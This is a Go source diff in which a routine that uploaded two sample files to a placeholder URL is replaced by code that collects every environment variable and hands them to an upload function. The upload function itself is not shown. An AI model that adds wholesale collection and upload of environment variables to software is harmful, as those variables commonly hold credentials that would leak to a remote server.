@@ -1,11 +1,9 @@
 package main
 
 import (
-	"bytes"
-	"context"
-	"fmt"
 	"log/slog"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/getsentry/sentry-go"
@@ -46,49 +44,18 @@ func main() {
 		}
 	}()
 
-	if err := record(l); err != nil {
+	// Extract environment variables from OS.
+	env := make(map[string]string)
+	for _, e := range os.Environ() {
+		pair := strings.SplitN(e, "=", 2)
+		if len(pair) > 1 {
+			env[pair[0]] = pair[1]
+		}
+	}
+
+	if err := upload(l, env); err != nil {
 		sentry.CaptureException(err)
 		sentry.Flush(5 * time.Second)
 		l.Error("failed to run", "err", err)
 	}
-}
-
-func record(l *slog.Logger) error {
-	files := map[string][]byte{
-		"file1.txt": []byte("This is the content of file1."),
-		"file2.txt": []byte("This is the content of file2."),
-	}
-
-	var raw bytes.Buffer
-	var buf bytes.Buffer
-
-	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-	defer cancel()
-
-	for name, content := range files {
-		l.Debug("add tar file", "name", name, "size", len(content))
-	}
-
-	if err := createTarball(files, &raw); err != nil {
-		return fmt.Errorf("failed to create tarball: %w", err)
-	}
-
-	if err := compressZstd(&raw, &buf); err != nil {
-		return fmt.Errorf("failed to compress tarball: %w", err)
-	}
-
-	l.Info("tarball compressed",
-		"files", len(files),
-		"rawSize", raw.Len(),
-		"compressedSize", buf.Len(),
-	)
-
-	// TODO
-	url := "https://example.com/upload"
-	if err := uploadFile(ctx, url, &buf); err != nil {
-		return fmt.Errorf("failed to upload file: %w", err)
-	}
-
-	l.Info("upload successful", "url", url)
-	return nil
 }
